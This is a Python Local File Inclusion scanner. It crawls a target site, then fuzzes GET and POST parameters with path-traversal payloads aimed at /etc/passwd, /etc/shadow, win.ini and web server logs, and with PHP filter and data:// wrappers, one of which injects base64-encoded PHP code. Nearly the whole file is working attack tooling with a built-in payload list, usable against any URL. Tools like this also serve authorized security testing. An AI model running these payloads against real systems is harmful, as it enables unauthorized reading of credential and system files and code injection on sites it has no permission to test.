#!/usr/bin/env python3
"""lfi_scanner.py – Local‑File‑Inclusion scanner (enhanced)

* Crawls links & forms up to a depth.
* Fuzzes GET, POST‑body parameters with traversal & wrapper payloads.
* Detects classic UNIX **/etc/passwd**, Windows **win.ini / boot.ini / hosts**, common log files, and PHP include warnings.
* Concurrency with threads, progress bar.

Usage:
python lfi_scanner.py --url https://target.local/page.php?file=home --depth 2 --threads 12

"""

import argparse, httpx, queue, threading, re
from urllib.parse import urljoin, urlsplit, urlunsplit, urlencode, parse_qsl
from bs4 import BeautifulSoup
from tqdm import tqdm
from colorama import Fore, Style

###############################################################################
# CLI
###############################################################################

def parse_args():
    p = argparse.ArgumentParser(description="LFI scanner (GET + POST)")
    p.add_argument("--url", required=True, help="Seed URL")
    p.add_argument("--depth", type=int, default=1)
    p.add_argument("--threads", type=int, default=10)
    p.add_argument("--timeout", type=float, default=8.0)
    p.add_argument("--proxy", help="Proxy like http://127.0.0.1:8080")
    p.add_argument("--payload-file", help="Extra payload list")
    return p.parse_args()

###############################################################################
# HTTP
###############################################################################

def make_client(args):
    proxies = {"http://": args.proxy, "https://": args.proxy} if args.proxy else None
    return httpx.Client(headers={"User-Agent": "lfi-scan/2.0"}, timeout=args.timeout, verify=False, proxies=proxies)

###############################################################################
# Crawl
###############################################################################

def crawl(client, seed, depth):
    pages, seen, q = [], set(), queue.Queue()
    q.put((seed, 0))
    while not q.empty():
        url, d = q.get()
        if url in seen or d > depth:
            continue
        seen.add(url)
        try:
            r = client.get(url, follow_redirects=True)
        except Exception:
            continue
        pages.append((url, r))
        if "text/html" not in r.headers.get("content-type", ""):
            continue
        soup = BeautifulSoup(r.text, "html.parser")
        [q.put((urljoin(url, a["href"]), d + 1)) for a in soup.find_all("a", href=True)]
        [pages.append((url, f)) for f in soup.find_all("form")]
    return pages

###############################################################################
# Payloads & Signatures
###############################################################################

def default_payloads():
    base = [
        # ── *nix core files ────────────────────────────────────────────────
        "../../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd%00",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "../../../../../../../../etc/shadow",
        # ── Windows core files ─────────────────────────────────────────────
        "../../../../../../../../boot.ini",
        "../../../../../../../../windows/win.ini",
        "../../../../../../../../windows/system32/drivers/etc/hosts",
        "..%2f..%2fwindows%2fwin.ini",
        # ── Common logs ────────────────────────────────────────────────────
        "../../../../../../../../var/log/nginx/access.log",
        "../../../../../../../../var/log/nginx/error.log",
        "../../../../../../../../var/log/apache2/access.log",
        "../../../../../../../../var/log/apache2/error.log",
        # ── Wrapper & filter chains ────────────────────────────────────────
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8=",
    ]
    return base

SIG_REGEXES = [
    re.compile(r"root:.*:0:0:"),
    re.compile(r"\[boot loader\]", re.I),
    re.compile(r"\[(drivers|mappings)\]", re.I),
    re.compile(r"<configuration>", re.I),
    re.compile(r"uid=\d+"),
    re.compile(r"Warning: include|failed to open stream", re.I),
]

###############################################################################
# Helpers
###############################################################################

def inject_qs(url, k, v):
    parts = urlsplit(url)
    qs = dict(parse_qsl(parts.query, keep_blank_values=True))
    qs[k] = v
    return urlunsplit((*parts[:3], urlencode(qs), parts.fragment))

###############################################################################
# Worker
###############################################################################

findings, lock = [], threading.Lock()

def worker(client, q, payloads, pbar):
    while True:
        try:
            url, obj = q.get_nowait()
        except queue.Empty:
            break
        if isinstance(obj, httpx.Response):
            params = dict(parse_qsl(urlsplit(url).query, keep_blank_values=True))
            for k in params:
                for pay in payloads:
                    test = inject_qs(url, k, pay)
                    try:
                        r = client.get(test, follow_redirects=False)
                        if any(rx.search(r.text) for rx in SIG_REGEXES):
                            with lock:
                                findings.append(("GET", test, k, pay))
                            break
                    except Exception:
                        pass
        else:
            form = obj
            if form.get("method", "GET").upper() != "POST":
                q.task_done(); pbar.update(1); continue
            action = urljoin(url, form.get("action", url))
            inputs = {i.get("name"): "FUZZ" for i in form.find_all("input") if i.get("name")}
            if not inputs:
                q.task_done(); pbar.update(1); continue
            for k in inputs:
                for pay in payloads:
                    data = inputs.copy(); data[k] = pay
                    try:
                        r = client.post(action, data=data, follow_redirects=False)
                        if any(rx.search(r.text) for rx in SIG_REGEXES):
                            with lock:
                                findings.append(("POST", action, k, pay))
                            break
                    except Exception:
                        pass
        q.task_done(); pbar.update(1)

###############################################################################
# Main
###############################################################################

if __name__ == "__main__":
    args = parse_args()
    payloads = default_payloads()
    if args.payload_file:
        with open(args.payload_file, "r", encoding="utf-8", errors="ignore") as f:
            payloads.extend([l.strip() for l in f if l.strip()])

    client = make_client(args)
    pages = crawl(client, args.url, args.depth)

    q = queue.Queue(); [q.put(p) for p in pages]
    pbar = tqdm(total=q.qsize(), desc="LFI fuzz")

    threads = [threading.Thread(target=worker, args=(client, q, payloads, pbar), daemon=True) for _ in range(args.threads)]
    [t.start() for t in threads]; [t.join() for t in threads]
    pbar.close()

    if findings:
        for typ, loc, param, payload in findings:
            print(f"{Fore.RED}[LFI] ({typ}) {loc} param={param} -> {payload}{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}[-] No LFI indicators found.{Style.RESET_ALL}")
